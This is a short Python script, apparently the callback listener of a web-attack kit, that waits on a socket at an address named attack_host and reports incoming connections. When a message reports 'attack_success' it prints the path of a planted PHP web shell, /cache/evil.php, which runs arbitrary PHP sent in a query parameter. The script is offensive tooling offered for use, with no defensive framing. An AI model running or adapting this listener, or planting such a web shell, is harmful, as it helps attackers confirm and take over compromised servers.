import socket

attack_host = '192.168.92.165'
attack_port = 8080

s = socket.socket()
s.bind((attack_host, attack_port))
s.listen(1)
while True:
	c,addr = s.accept()
	print('connect addr is: ' + str(addr[0]))
	data = c.recv(1024)
	if str(data).find('attack_success') != -1:
		print("[+] !!!!!!!! ATTACK SUCCESS !!!!!!!!")
		print("[+] shell url is /cache/evil.php?100=phpinfo();\n")
	print(data)